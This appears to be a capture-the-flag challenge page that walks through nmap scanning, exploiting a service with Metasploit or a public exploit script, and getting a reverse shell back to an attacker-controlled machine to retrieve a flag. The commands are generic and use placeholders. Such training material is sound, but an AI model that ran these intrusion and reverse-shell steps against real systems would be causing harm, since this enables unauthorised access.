Use nmap to scan for open ports of the host provided at the play link below, identify applications running on each port, use Metaploit or a exploit script you find online to take advantage of the first vulnerability.

#### Instructions for Completing the Challenge

- Run nmap
- Run Metasploit or an exploit script to take advantage of a vulnerability in the first identified app
- Execute commands remotely
- Find the flag program in the current directory and use it to sign the challenge salt: `./red_ch1.flag <SALT>`

#### Nmap
Nmap is a port scanner and a frequently utilized tool in the pocket of any pen-tester.

##### Installing Nmap
 
For RedHat/CentOS: `sudo yum install nmap`

For Debian/Ubuntu: `apt-get install nmap`

##### Scanning with Nmap

Once nmap is installed you can scan the target host with `nmap <target_host> -Pn -vv`

Other useful parameters are listed below:

* `-p` {PORT_NUMBERS}: Scan ports of the target. It can be a single port number or
a range of ports. Examples: `-p22,23,80` -> scan 22,23 and 80 , `-p8000-9000` -> scan a port range, `-p-` -> scan all the ports
* `-A`: Determine service/version and OS info.

For a detailed list of all parameters available please refer to the [Nmap Reference Guide](https://nmap.org/book/man.html).

Once you run nmap you will uncover a set of open ports. 
What services are running on those ports? Can you navigate to each service in a browser?

#### Metasploit

**Note**: this is the cooler option but you will need to get a bit of setup done and you need your exploit machine to be publicly accessible so the vulnerable machine can "call home".
If you're looking for the quick fix scroll down to the **Exploit Script** option below.

If you have Docker installed you can simply run the metasploit container image. Metasploit should be installed on a EC2 that is internet accessible to allow for the Meterpreter to run. 

##### Docker Install

* For RedHat/CentOS: `sudo yum install docker` or `sudo amazon-linux-extras install docker` (AWS Linux 2)
* For Debian/Ubuntu: `sudo apt install docker.io`

##### Running Docker

* Start Docker with: `sudo service docker start`
* Add permissions to your userto pull and run container images: `sudo usermod -a -G docker ec2-user`
* Logout and relogin.

##### Running the Metasploit Image


Pull metasploit docker image from DockerHub

`docker pull metasploitframework/metasploit-framework`

Run metasploit container, forward port 4444 (needed for reverse shell), make sure those ports are open in security groups etc in your metasploit machine

`docker run -it -p 4444-4450:4444-4450 metasploitframework/metasploit-framework`

Search for the exploit you'd like to use based on nmap results:

`search <name of the application you are looking to exploit>`

Select the exploit you are going to use from the search results:

`use <path/to/the/exploit>`

Set the host IP and port for the target machine
IMPORTANT, if your host is behind a load balancer you should choose 1 of the load balancer IPs for the attack. You can determine the ips with `nslookup <HOST_NAME>`

`set RHOSTS <host>`

`set RPORT <port>`

If your target is running on an encrypted port then you need to enable SSL

`set SSL true`

Set the host IP and port for the machine running Metasploit. This machine should be publcly available and accessible over ports 4444-4450

`set LHOST <remote IP of Metasploit machine>`

`set LPORT 4444`

Run the exploit!

`run`

This may fail in some cases, if it fails once reset the LHOST and run again

`set LHOST <remote IP of Metasploit machine>`
`run`

You should be able to get shell at this point and run commands in the container. 

To drop into a OS shell use the `shell` command.

Can you get the flag? Good luck!

If you want to learn more about Metasploit, please check out this free course from Offensive Security: [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)

#### Exploit Script

Before being ported to Metasploit for easy usage, exploits are usually released in the wild, in an ad-hoc way. Hackers can also take advantage of those to carry out their attacks. 

If the Metasploit option didn't work or you'd like to try another way of exploiting the same vulnerability, here it is:

In this scenario we are going to use a public exploit available on GitHub:

First, you need to clone the repository into your attacker's machine:

`git clone <exploit_github>`

Go to the project folder and install the library dependencies:

`cd <exploit_github>`

`sudo gem install highline`

You should be able to excute the exploit like so:

`./exploit.rb {VICTIM_IP_OR_URL:VICTIM_PORT}`

